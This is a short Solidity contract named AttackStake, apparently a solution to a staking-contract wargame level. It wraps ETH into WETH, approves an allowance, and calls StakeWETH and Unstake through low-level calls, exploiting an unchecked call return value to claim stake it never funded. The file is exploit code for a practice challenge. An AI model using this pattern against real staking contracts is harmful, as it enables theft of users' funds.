pragma solidity ^0.8.0;

interface IWETH {
    function deposit() external payable;
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

contract AttackStake {
    address private immutable STAKE_INSTANCE;
    address public WETH_ADDRESS = 0xa16E02E87b7454126E5E10d957A927A7F5B5d2be;

    constructor(address stakeInstance) {
        STAKE_INSTANCE = stakeInstance;
    }

    function depositEthToWeth() external payable {
        IWETH(WETH_ADDRESS).deposit{value: msg.value}();
    }

    function approveWeth() external {
        IWETH(WETH_ADDRESS).approve(STAKE_INSTANCE, 1000 * 1e18);
    }

    function stakeWeth() external {
        (bool success,) = STAKE_INSTANCE.call(abi.encodeWithSelector(bytes4(keccak256("StakeWETH(uint256)")), 1000 * 1e18));
    }

    function unstake() external {
        (bool success,) = STAKE_INSTANCE.call(abi.encodeWithSelector(bytes4(keccak256("Unstake(uint256)")), 1000 * 1e18));
        require(success, "Unstake failed");
    }
}